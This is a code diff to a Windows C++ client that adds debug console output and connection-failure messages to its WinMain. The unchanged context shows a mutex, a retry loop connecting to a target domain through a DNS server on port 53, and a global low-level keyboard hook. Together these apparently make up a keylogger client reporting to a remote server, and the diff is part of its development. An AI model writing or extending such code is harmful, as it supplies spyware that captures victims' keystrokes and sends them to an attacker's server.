@@ -11,6 +11,15 @@
 int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance,
                    _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
     
+    #ifdef _DEBUG
+    // Create console for debug output
+    AllocConsole();
+    FILE* fp;
+    freopen_s(&fp, "CONOUT$", "w", stdout);
+    freopen_s(&fp, "CONOUT$", "w", stderr);
+    std::cout << "[DEBUG] Client started in DEBUG mode" << std::endl;
+    #endif
+    
     HANDLE mutex = CreateMutex(nullptr, TRUE, MUTEX_NAME);
     if (!mutex) {
         return FALSE;
@@ -21,16 +30,39 @@ int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance,
         return TRUE;
     }
     
+    #ifdef _DEBUG
+    std::string myIP = getLocalTailscaleIP();
+    std::cout << "[DEBUG] My Tailscale IP: " << myIP << std::endl;
+    std::cout << "[DEBUG] DNS Server: " << DNS_SERVER_IP << std::endl;
+    std::cout << "[DEBUG] Target Domain: " << TARGET_DOMAIN << std::endl;
+    std::cout << "[DEBUG] Attempting connection..." << std::endl;
+    #endif
+    
     int retryCount = 0;
     while ((connectionId = startConnection(TARGET_DOMAIN.c_str())) == -1) {
         retryCount++;
+        
+        #ifdef _DEBUG
+        std::cout << "[DEBUG] Connection attempt #" << retryCount << " failed!" << std::endl;
+        #endif
+        
         Sleep(2000);
         
         if (retryCount > 10) {
+            #ifdef _DEBUG
+            std::cout << "[ERROR] Failed after 10 retries. Exiting..." << std::endl;
+            MessageBoxA(nullptr, 
+                "Connection failed!\n\nCheck:\n1. Server.exe is running\n2. Firewall allows port 53\n3. DNS_SERVER_IP is correct", 
+                "Client Error", MB_OK | MB_ICONERROR);
+            #endif
             CloseHandle(mutex);
             return FALSE;
         }
     }
+    
+    #ifdef _DEBUG
+    std::cout << "[SUCCESS] Connected! Connection ID: " << connectionId << std::endl;
+    #endif
     
 
     _k_hook = SetWindowsHookEx(WH_KEYBOARD_LL, process_key, nullptr, 0);
